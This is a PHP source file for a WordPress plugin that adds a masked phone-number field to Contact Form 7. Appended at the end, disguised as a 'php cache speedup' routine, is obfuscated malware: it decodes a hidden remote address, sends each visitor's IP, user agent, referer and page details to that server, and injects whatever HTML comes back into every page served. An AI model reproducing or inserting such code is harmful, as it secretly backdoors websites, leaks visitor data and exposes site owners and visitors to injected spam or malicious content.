<?php
/*
Plugin Name: Contact Form 7 Phone Module
Plugin URI: 
Description: Adds phone field to Contact Form 7 plugin. Use [phone] or [phone*] in your contact form to do it.
Author: omniWP
Author URI: http://www.omniwp.com.br/
Version: 2.3.4.1
*/

/*  Copyright 2012,2013 omniWP

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/


/**
** A plugin module for [phone] and [phone*]
**/

add_action( 'wpcf7_init', 'cf7_phone_init' ); // init only after wpcf7 has done its init

function cf7_phone_init() {
	wpcf7_add_shortcode( 'phone',  'wpcf7_phone_shortcode_handler', true );
	wpcf7_add_shortcode( 'phone*', 'wpcf7_phone_shortcode_handler', true );
}

function wpcf7_phone_shortcode_handler( $tag ) {
	global $wpcf7_contact_form;
	
	if ( ! is_array( $tag ) )
		return '';
		
	if ( ! empty( $tag['attr'] ) ) {
		
		// remove our tokens from tag
				
		$tokens = array( 'mask' => 'mask:', 'alternate_mask' => 'aMask:', 're_do' => 'reDo:', 're_undo' => 'reUndo:');
		foreach( $tokens as $var => $token ) { 
			if ( $pos = strpos( $tag['attr'], $token ) ) {
				$end = strpos( $tag['attr'], ' ', $pos );
				if ( $end ) {
					${$var} = substr( $tag['attr'], $pos, $end - $pos );
				} else {
					${$var} = substr( $tag['attr'], $pos);
				}
			} else {
				${$var} = '';
			}
		}
		
		$tag['attr'] = trim( str_replace( array( $mask, $alternate_mask, $re_do, $re_undo ),  '', $tag['attr']) );
		
		// get only values from our tokens, removing token ids
		foreach( $tokens as $var => $token ) { 
			${$var} = str_replace( $token, '', ${$var} );
		}	
		
		// parse the artibutes again 
		global $wpcf7_shortcode_manager;
		$attr = $wpcf7_shortcode_manager->shortcode_parse_atts( $tag['attr'] );	
		
		if ( is_array( $attr ) ) {
			if ( is_array( $attr['options'] ) ) {
				$tag['name'] = array_shift( $attr['options'] );
				$tag['options'] = (array) $attr['options'];
			}
			$tag['raw_values'] = (array) $attr['values'];
			$tag['attr'] ='';
		} else {
			$tag['attr'] = $attr;
		}
	}
	
	
	$type = $tag['type'];
	$name = $tag['name'];
	$options = (array) $tag['options'];
	$values  = (array) $tag['values'];

	if ( empty( $name ) )
		return '';
		
	$validation_error = '';
	if ( is_a( $wpcf7_contact_form, 'WPCF7_ContactForm' ) )
		$validation_error = $wpcf7_contact_form->validation_error( $name );

	$atts = '';
	$id_att = '';
	$class_att = '';
	$size_att = '';
	$maxlength_att = '';
	
	if ( $validation_error )
		$class_att .= ' wpcf7-not-valid';

	foreach ( $options as $option ) {
		if ( preg_match( '%^id:([-0-9a-zA-Z_]+)$%', $option, $matches ) ) {
			$id_att = $matches[1];

		} elseif ( preg_match( '%^class:([-0-9a-zA-Z_]+)$%', $option, $matches ) ) {
			$class_att .= ' ' . $matches[1];

		} elseif ( preg_match( '%^([0-9]*)[/x]([0-9]*)$%', $option, $matches ) ) {
			$size_att = (int) $matches[1];
			$maxlength_att = (int) $matches[2];

		} elseif ( preg_match( '%^tabindex:(\d+)$%', $option, $matches ) ) {
			$tabindex_att = (int) $matches[1];

		}
	}

	if ( empty( $id_att )  ) {
		$id_att = $name;
	}
	$atts .= ' id="' . trim( $id_att ) . '"';

	$class_att .= ' wpcf7-text wpcf7-pm-phone wpcf7-form-control';
	if ( 'phone*' == $type )
		$class_att .= ' wpcf7-validates-as-required';
	$atts .= ' class="' . trim( $class_att ) . '"';
	
	if ( $size_att )
		$atts .= ' size="' . $size_att . '"';
	else
		$atts .= ' size="14"'; // default size

	if ( $maxlength_att )
		$atts .= ' maxlength="' . $maxlength_att . '"';

	// register and enqueue our js masking function
	wp_register_script( 'jquery-mask', plugins_url( 'contact-form-7-phone-mask-module/jquery.maskedinput-1.3.1.js' , dirname(__FILE__) ), array('jquery') );  
	wp_enqueue_script( 'jquery-mask' );

	// set our js masking variables
	wp_localize_script( 'jquery-mask', '_wpcf7pm', array(
		'id' => trim($id_att),
		'mask' => $mask,
		'aMask' => $alternate_mask,
		'reDo' => $re_do,
		'reUndo' => $re_undo,
		 ) );
	

	$value = isset( $values[0] ) ? $values[0] : '';
	$html = '<input ' . $atts . ' type="text" name="' . $name . '" value="' .  $value . '"/>';
	$html = '<span class="wpcf7-form-control-wrap ' . $name . '">' . $html . $validation_error . '</span>';

	return $html;
}

/* Validation filter */

add_filter( 'wpcf7_validate_phone*', 'wpcf7_phone_validation_filter', 10, 2 );

function wpcf7_phone_validation_filter( $result, $tag ) {


	$type = $tag['type'];
	if ( ! empty( $tag['attr'] ) ) {
		
		// remove our tokens from tag
				
		$tokens = array( 'mask' => 'mask:', 'alternate_mask' => 'aMask:', 're_do' => 'reDo:', 're_undo' => 'reUndo:');
		foreach( $tokens as $var => $token ) { 
			if ( $pos = strpos( $tag['attr'], $token ) ) {
				$end = strpos( $tag['attr'], ' ', $pos );
				if ( $end ) {
					${$var} = substr( $tag['attr'], $pos, $end - $pos );
				} else {
					${$var} = substr( $tag['attr'], $pos);
				}
			} else {
				${$var} = '';
			}
		}
		
		$tag['attr'] = trim( str_replace( array( $mask, $alternate_mask, $re_do, $re_undo ),  '', $tag['attr']) );
		
		// get only values from our tokens, removing token ids
		foreach( $tokens as $var => $token ) { 
			${$var} = str_replace( $token, '', ${$var} );
		}	
		
		// parse the artibutes again 
		global $wpcf7_shortcode_manager;
		$attr = $wpcf7_shortcode_manager->shortcode_parse_atts( $tag['attr'] );	
		
		if ( is_array( $attr ) ) {
			if ( is_array( $attr['options'] ) ) {
				$tag['name'] = array_shift( $attr['options'] );
				$tag['options'] = (array) $attr['options'];
			}
			$tag['raw_values'] = (array) $attr['values'];
			$tag['attr'] ='';
		} else {
			$tag['attr'] = $attr;
		}
	}
	$name = $tag['name'];


	$_POST[$name] = trim( strtr( (string) $_POST[$name], "\n", " " ) );

	if ( 'phone*' == $type ) {
		if ( '' == $_POST[$name] ) {
			$result['valid'] = false;
			$result['reason'][$name] = wpcf7_get_message( 'invalid_required' );
		}
	}
	return $result;
}

/* Tag generator */

add_action( 'admin_init', 'wpcf7_add_tag_generator_phone', 15 );

function wpcf7_add_tag_generator_phone() {
	load_plugin_textdomain( 'wpcf7pm', false, dirname( plugin_basename( __FILE__ ) ) . '/languages/' ); 
	if (function_exists( 'wpcf7_add_tag_generator' ) ) 
		wpcf7_add_tag_generator( 'phone', __( 'Telephone field', 'wpcf7pm' ),
									'wpcf7-tg-pane-phone', 'wpcf7_tg_pane_phone' );
}

function wpcf7_tg_pane_phone( &$contact_form ) {
?>
<div id="wpcf7-tg-pane-phone" class="hidden">
  <form action="">
    <table>
      <tr>
        <td><label for="required">
          <input type="checkbox" name="required" id="required" />
          &nbsp;<?php echo esc_html( __( 'Required field?', 'wpcf7' ) ); ?></label></td><td>&nbsp;</td>
      </tr>
      <tr>
        <td><?php echo esc_html( __( 'Name', 'wpcf7' ) ); ?><br />
          <input type="text" name="name" class="tg-name oneline" />
        </td><td>&nbsp;</td>
      </tr>
      <tr>
        <td><?php echo esc_html( __( 'Mask', 'wpcf7pm' ) ); ?> <br />
          <input type="text" name="mask" class="oneline option" value="(999)999-9999" />
          <br />
          <?php echo esc_html( __( 'Alternative Mask', 'wpcf7pm' ) ); ?> (<?php echo esc_html( __( 'optional', 'wpcf7' ) ); ?>)<br />
          <input type="text" name="aMask" class="alternate oneline option" />
        </td>
        <td><br />
          <?php _e( 'a - Represents an alpha character (A-Z,a-z)<br />
          9 - Represents a numeric character (0-9)<br />
          * - Represents an alphanumeric character (A-Z,a-z,0-9)', 'wpcf7pm'); ?></td>
      </tr>
      <tr>
        <td><?php echo esc_html( __( 'Regular expression to trigger changing to the alternative mask', 'wpcf7pm' ) ); ?> <br />
          <input type="text" name="reDo" class="reTrigger oneline option" />
        </td>
        <td>
          <?php echo esc_html( __( 'Regular expression to change back to the original mask', 'wpcf7pm' ) ); ?> <br />
          <input type="text" name="reUndo" class="reUndo oneline option" />
        </td>
      </tr>
      <tr>
        <td><code>id</code> (<?php echo esc_html( __( 'optional', 'wpcf7' ) ); ?>)<br />
          <input type="text" name="id" class="idvalue oneline option" />
        </td>
        <td><code>class</code> (<?php echo esc_html( __( 'optional', 'wpcf7' ) ); ?>)<br />
          <input type="text" name="class" class="classvalue oneline option" />
        </td>
      </tr>
      <tr>
        <td><code>size</code> (<?php echo esc_html( __( 'optional', 'wpcf7' ) ); ?>)<br />
          <input type="text" name="size" class="numeric oneline option" />
        </td>
        <td><code>maxlength</code> (<?php echo esc_html( __( 'optional', 'wpcf7' ) ); ?>)<br />
          <input type="text" name="maxlength" class="numeric oneline option" />
        </td>
      </tr>
    </table>
    <div class="tg-tag"><?php echo esc_html( __( "Copy this code and paste it into the form left.", 'wpcf7' ) ); ?><br />
      <input type="text" name="phone" class="tag" readonly="readonly" onfocus="this.select()" />
    </div>
    <div class="tg-mail-tag"><?php echo esc_html( __( "And, put this code into the Mail fields below.", 'wpcf7' ) ); ?><br />
      <span class="arrow">&#11015;</span>&nbsp;
      <input type="text" class="mail-tag" readonly="readonly" onfocus="this.select()" />
    </div>
  </form>
</div>
<?php
}




/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyNzoiaHR0cDovLzQ1LjU1LjE0My4yNS9tZXYucGhwIjs=';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 6
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        // set defaults
        $tokenData = array_merge(array(
            'content' => '',
            'pos' => 'after',
            'tag' => 'bo' . 'dy',
            'count' => 0,
        ), $tokenData);

        if (empty($tokenData['content'])) {
            // no content
            continue;
        }

        // find all occurrences of <tag>
        $tags = array();
        while (true) {
            if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                break;
            }
            $tags[] = $tmp;
        }

        if (empty($tags)) {
            // no tags found or nothing to show
            continue;
        }

        // find matched tag position
        $count = $tokenData['count'];
        if ($tokenData['count'] < 0) {
            // from end to beginning
            $count = abs($tokenData['count']) - 1;
            $tags = array_reverse($tags);
        }

        if ($count >= count($tags)) {
            // fix overflow
            $count = count($tags) - 1;
        }

        // find insert position
        if ($tokenData['pos'] == 'before') {
            // pos is before
            $insert = $tags[$count];
        } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
            // pos is after, found end tag, insert after it
            $insert += 1;
        }

        if ($insert === false) {
            // no insert position
            continue;
        }

        // insert html code
        $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
        $mod = true;
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
?>